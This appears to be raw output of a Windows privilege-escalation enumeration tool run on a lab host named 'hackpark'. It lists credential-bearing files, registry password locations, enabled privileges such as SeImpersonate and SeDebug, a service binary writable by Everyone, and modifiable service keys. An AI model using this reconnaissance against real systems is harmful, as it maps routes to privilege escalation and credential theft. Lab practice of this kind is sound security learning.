C:\Program Files\Amazon\SSM\Plugins\awsDomainJoin\AWS.DomainJoin.exe.config                                      
C:\Program Files\Amazon\SSM\Plugins\awsDomainJoin\log4net.config                                                 
C:\Program Files\Amazon\Xentools\Installer.exe.config                                                            
C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\Confirm-Password.ps1                                     
C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\New-RandomPassword.ps1                                   
C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\Send-AdminCredentials.ps1                                
C:\ProgramData\Amazon\EC2-Windows\Launch\Settings\Ec2LaunchSettings.exe.config                                   
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Randomize-LocalAdminPassword.ps1                                
C:\Users\Administrator\AppData\Local\Microsoft_Corporation\ServerManager.exe_StrongName_m3xk0k0ucj0oj3ai2hibnhnv4xobnimj\6.3.0.0\user.config                                                                                      
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Confirm-Password.ps1                                 
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\New-RandomPassword.ps1                               
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Send-AdminCredentials.ps1                            
C:\Users\All Users\Amazon\EC2-Windows\Launch\Settings\Ec2LaunchSettings.exe.config                               
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Randomize-LocalAdminPassword.ps1                            
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
===========================================================================                                      
Interface List                                                                                                   
 14...02 be 3b 95 69 49 ......AWS PV Network Device #0                                                           
  1...........................Software Loopback Interface 1                                                      
 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter                                                           
===========================================================================                                      
                                                                                                                 
IPv4 Route Table                                                                                                 
===========================================================================                                      
Active Routes:                                                                                                   
Network Destination        Netmask          Gateway       Interface  Metric                                      
          0.0.0.0          0.0.0.0        10.10.0.1     10.10.97.210     10                                      
        10.10.0.0      255.255.0.0         On-link      10.10.97.210    266                                      
     10.10.97.210  255.255.255.255         On-link      10.10.97.210    266                                      
    10.10.255.255  255.255.255.255         On-link      10.10.97.210    266                                      
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306                                      
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306                                      
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306                                      
  169.254.169.123  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
  169.254.169.249  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
  169.254.169.250  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
  169.254.169.251  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
  169.254.169.253  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
  169.254.169.254  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306                                      
        224.0.0.0        240.0.0.0         On-link      10.10.97.210    266                                      
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306                                      
  255.255.255.255  255.255.255.255         On-link      10.10.97.210    266                                      
===========================================================================                                      
Persistent Routes:                                                                                               
  None                                                                                                           
                                                                                                                 
IPv6 Route Table                                                                                                 
===========================================================================                                      
Active Routes:                                                                                                   
 If Metric Network Destination      Gateway                                                                      
  1    306 ::1/128                  On-link                                                                      
 14    266 fe80::/64                On-link                                                                      
 14    266 fe80::b45b:96ae:4248:215/128                                                                          
                                    On-link                                                                      
  1    306 ff00::/8                 On-link                                                                      
 14    266 ff00::/8                 On-link                                                                      
===========================================================================                                      
Persistent Routes:                                                                                               
  None                                                                                                           
                                                                                                                 
 [+] Hosts file                                                                                                  
                                                                                                                 
                                                                                                                 
 [+] McAffee SiteList.xml                                                                                        
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
                                                                                                                 
 [+] GPP Password                                                                                                
                                                                                                                 
 [+] Cloud Credentials                                                                                           
                                                                                                                 
 [+] AppCmd                                                                                                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe               
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                   
                                                                                                                 
 [+] Files in registry that may contain credentials                                                              
   [i] Searching specific files that may contains credentials.                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files 
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                              
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                        
    DefaultDomainName    REG_SZ                                                                                  
    DefaultUserName    REG_SZ                                                                                    
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                       
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                             
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                             
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                   
                                                                                                                 
Looking inside HKCU\Software\TightVNC\Server                                                                     
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                          
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                  
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                    
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml                                                             
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml                                                         
C:\Windows\Panther\setupinfo                                                                                     
C:\Windows\System32\inetsrv\appcmd.exe                                                                           
C:\Windows\SysWOW64\inetsrv\appcmd.exe                                                                           
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml   
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml    
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                   
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                  
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml   
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe                                                                                                    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe                                                                                                    
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190803.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190804.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190805.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex201002.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex220927.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC2\u_ex190803.log                                                                   
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\setup\Web.config                                                                              
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
                                                                                                                 
 [+] WIFI                                                                                                        
[*] BASIC USER INFO                                                                                              
   [i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege           
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups         
                                                                                                                 
 [+] CURRENT USER                                                                                                
User name                    Administrator                                                                       
Full Name                                                                                                        
Comment                      Built-in account for administering the computer/domain                              
User's comment                                                                                                   
Country/region code          000 (System Default)                                                                
Account active               Yes                                                                                 
Account expires              Never                                                                               
                                                                                                                 
Password last set            8/3/2019 10:43:23 AM                                                                
Password expires             9/14/2019 10:43:23 AM                                                               
Password changeable          8/3/2019 10:43:23 AM                                                                
Password required            Yes                                                                                 
User may change password     Yes                                                                                 
                                                                                                                 
Workstations allowed         All                                                                                 
Logon script                                                                                                     
User profile                                                                                                     
Home directory                                                                                                   
Last logon                   9/27/2022 9:48:46 AM                                                                
                                                                                                                 
Logon hours allowed          All                                                                                 
                                                                                                                 
Local Group Memberships      *Administrators                                                                     
Global Group memberships     *None                                                                               
The command completed successfully.                                                                              
                                                                                                                 
The request will be processed at a domain controller for domain WORKGROUP.                                       
                                                                                                                 
                                                                                                                 
USER INFORMATION                                                                                                 
----------------                                                                                                 
                                                                                                                 
User Name              SID                                                                                       
====================== ===========================================                                               
hackpark\administrator S-1-5-21-141259258-288879770-3894983326-500                                               
                                                                                                                 
                                                                                                                 
GROUP INFORMATION                                                                                                
-----------------                                                                                                
                                                                                                                 
Group Name                                                    Type             SID          Attributes                                                                                                                            
============================================================= ================ ============ ===============================================================                                                                       
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group                                                                                    
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner                                                                       
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group                                                                                    
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group                                                                                    
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                                                                                    
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                                                                                       
                                                                                                                 
                                                                                                                 
PRIVILEGES INFORMATION                                                                                           
----------------------                                                                                           
                                                                                                                 
Privilege Name                  Description                               State                                  
=============================== ========================================= ========                               
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled                                
SeSecurityPrivilege             Manage auditing and security log          Disabled                               
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled                                
SeLoadDriverPrivilege           Load and unload device drivers            Disabled                               
SeSystemProfilePrivilege        Profile system performance                Disabled                               
SeSystemtimePrivilege           Change the system time                    Disabled                               
SeProfileSingleProcessPrivilege Profile single process                    Disabled                               
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled                               
SeCreatePagefilePrivilege       Create a pagefile                         Disabled                               
SeBackupPrivilege               Back up files and directories             Disabled                               
SeRestorePrivilege              Restore files and directories             Disabled                               
SeShutdownPrivilege             Shut down the system                      Disabled                               
SeDebugPrivilege                Debug programs                            Enabled                                
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled                               
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled                                
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled                               
SeUndockPrivilege               Remove computer from docking station      Disabled                               
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled                               
SeImpersonatePrivilege          Impersonate a client after authentication Enabled                                
SeCreateGlobalPrivilege         Create global objects                     Enabled                                
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled                               
SeTimeZonePrivilege             Change the time zone                      Disabled                               
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled                               
                                                                                                                 
ERROR: Unable to get user claims information.                                                                    
                                                                                                                 
 [+] USERS                                                                                                       
                                                                                                                 
User accounts for \\HACKPARK                                                                                     
                                                                                                                 
-------------------------------------------------------------------------------                                  
Administrator            Guest                    jeff                                                           
The command completed successfully.                                                                              
                                                                                                                 
                                                                                                                 
 [+] GROUPS                                                                                                      
                                                                                                                 
Aliases for \\HACKPARK                                                                                           
                                                                                                                 
-------------------------------------------------------------------------------                                  
*Access Control Assistance Operators                                                                             
*Administrators                                                                                                  
*Backup Operators                                                                                                
*Certificate Service DCOM Access                                                                                 
*Cryptographic Operators                                                                                         
*Distributed COM Users                                                                                           
*Event Log Readers                                                                                               
*Guests                                                                                                          
*Hyper-V Administrators                                                                                          
*IIS_IUSRS                                                                                                       
*Network Configuration Operators                                                                                 
*Performance Log Users                                                                                           
*Performance Monitor Users                                                                                       
*Power Users                                                                                                     
*Print Operators                                                                                                 
*RDS Endpoint Servers                                                                                            
*RDS Management Servers                                                                                          
*RDS Remote Access Servers                                                                                       
*Remote Desktop Users                                                                                            
*Remote Management Users                                                                                         
*Replicator                                                                                                      
*Users                                                                                                           
*WinRMRemoteWMIUsers__                                                                                           
The command completed successfully.                                                                              
                                                                                                                 
                                                                                                                 
 [+] ADMINISTRATORS GROUPS                                                                                       
Alias name     Administrators                                                                                    
Comment        Administrators have complete and unrestricted access to the computer/domain                       
                                                                                                                 
Members                                                                                                          
                                                                                                                 
-------------------------------------------------------------------------------                                  
Administrator                                                                                                    
The command completed successfully.                                                                              
                                                                                                                 
                                                                                                                 
 [+] CURRENT LOGGED USERS                                                                                        
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME                                      
>administrator         console             1  Active      none   9/27/2022 9:48 AM                               
                                                                                                                 
 [+] Kerberos Tickets                                                                                            
                                                                                                                 
Current LogonId is 0:0x256d9                                                                                     
                                                                                                                 
Cached Tickets: (0)                                                                                              
                                                                                                                 
 [+] CURRENT CLIPBOARD                                                                                           
   [i] Any password inside the clipboard?                                                                        
                                                                                                                 
[*] SERVICE VULNERABILITIES                                                                                      
                                                                                                                 
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
                                                                                                                 
 [+] GPP Password                                                                                                
                                                                                                                 
 [+] Cloud Credentials                                                                                           
                                                                                                                 
 [+] AppCmd                                                                                                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe               
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                   
                                                                                                                 
 [+] Files in registry that may contain credentials                                                              
   [i] Searching specific files that may contains credentials.                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files 
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                              
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                        
    DefaultDomainName    REG_SZ                                                                                  
    DefaultUserName    REG_SZ                                                                                    
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                       
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                             
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                             
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                   
                                                                                                                 
Looking inside HKCU\Software\TightVNC\Server                                                                     
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                          
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                  
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                    
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml                                                             
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml                                                         
C:\Windows\Panther\setupinfo                                                                                     
C:\Windows\System32\inetsrv\appcmd.exe                                                                           
C:\Windows\SysWOW64\inetsrv\appcmd.exe                                                                           
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml   
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml    
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                   
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                  
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml   
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe                                                                                                    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe                                                                                                    
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190803.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190804.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190805.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex201002.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex220927.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC2\u_ex190803.log                                                                   
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\setup\Web.config                                                                              
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                 
C:\Program Files\Amazon\EC2Launch\EC2Launch.exe NT AUTHORITY\SYSTEM:(I)(F)                                       
                                                BUILTIN\Administrators:(I)(F)                                    
                                                                                                                 
C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe NT AUTHORITY\SYSTEM:(I)(F)                                      
                                                 BUILTIN\Administrators:(I)(F)                                   
                                                                                                                 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                 
                                                                                                                 
C:\Program Files\Amazon\XenTools\LiteAgent.exe NT AUTHORITY\SYSTEM:(I)(F)                                        
                                               BUILTIN\Administrators:(I)(F)                                     
                                                                                                                 
C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe NT AUTHORITY\SYSTEM:(I)(F)                                
                                                       BUILTIN\Administrators:(I)(F)                             
                                                                                                                 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                    
                                                                                                                 
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                 
                                                                                                                 
C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)                                                               
                        BUILTIN\Administrators:(I)(F)                                                            
                                                                                                                 
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                        
                                                                                                                 
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)                                                                
                                  BUILTIN\Administrators:(I)(F)                                                  
                                                                                                                 
                                                                                                                 
 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY                                                                
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NETFramework                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\1394ohci                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\3ware                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ACPI                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpiex                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpipagr                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AcpiPmi                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpitime                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ADP80XX                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\adsi                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AeLookupSvc                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AFD                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\agp440                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ahcache                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ALG                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmazonSSMAgent                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmdK8                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmdPPM                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdsata                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdsbs                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdxata                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppHostSvc                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppID                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppIDSvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Appinfo                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppMgmt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppReadiness                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppXSvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\arcsas                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ASP.NET                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ASP.NET_4.0.30319                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\aspnet_state                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AsyncMac                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\atapi                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AudioEndpointBuilder                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Audiosrv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AWSLiteAgent                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AWSNVMe                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\b06bdrv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BasicDisplay                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BasicRender                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BattC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Beep                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bfadfcoei                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bfadi                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BFE                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BITS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bowser                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BrokerInfrastructure                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Browser                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bxfcoe                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bxois                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cdfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cdrom                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CertPropSvc                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cht4vbd                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CLFS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\clr_optimization_v4.0.30319_32               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\clr_optimization_v4.0.30319_64               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CmBatt                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CNG                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CngHwAssist                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CompositeBus                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\COMSysApp                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\condrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\crypt32                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CryptSvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DCLocator                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\defragsvc                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DeviceAssociationService                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DeviceInstall                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dfsc                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dhcp                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\disk                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\dmvsc                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dnscache                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\dot3svc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\drmkaud                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DsmSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DXGKrnl                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\E1G60                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Eaphost                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ebdrv                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ec2Config                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EFS                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\elxfcoe                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\elxstor                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ErrDev                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ESENT                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EventLog                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EventSystem                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\exfat                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fastfat                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fcvsc                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fdc                                          
